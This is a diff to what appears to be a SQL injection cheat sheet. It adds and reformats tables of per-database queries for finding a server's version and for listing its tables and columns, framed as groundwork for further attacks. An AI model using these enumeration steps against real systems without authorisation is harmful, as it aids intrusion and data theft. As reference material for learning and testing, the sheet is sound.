@@ -72,12 +72,22 @@ You can concatenate together multiple strings to make a single string.
 
 You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.
 
-|   |   |
-|---|---|
-|Oracle|`SELECT banner FROM v$version   SELECT version FROM v$instance   `|
-|Microsoft|`SELECT @@version`|
-|PostgreSQL|`SELECT version()`|
-|MySQL|`SELECT @@version`|
+|            |                                                                    |
+| ---------- | ------------------------------------------------------------------ |
+| Oracle     | `SELECT banner FROM v$version   SELECT version FROM v$instance   ` |
+| Microsoft  | `SELECT @@version`                                                 |
+| PostgreSQL | `SELECT version()`                                                 |
+| MySQL      | `SELECT @@version`                                                 |
+#### Database contents
+
+You can list the tables that exist in the database, and the columns that those tables contain.
+
+|            |                                                                                                                              |
+| ---------- | ---------------------------------------------------------------------------------------------------------------------------- |
+| Oracle     | `SELECT * FROM all_tables   SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`                              |
+| Microsoft  | `SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   ` |
+| PostgreSQL | `SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   ` |
+| MySQL      | `SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`    |
 
 # example
 
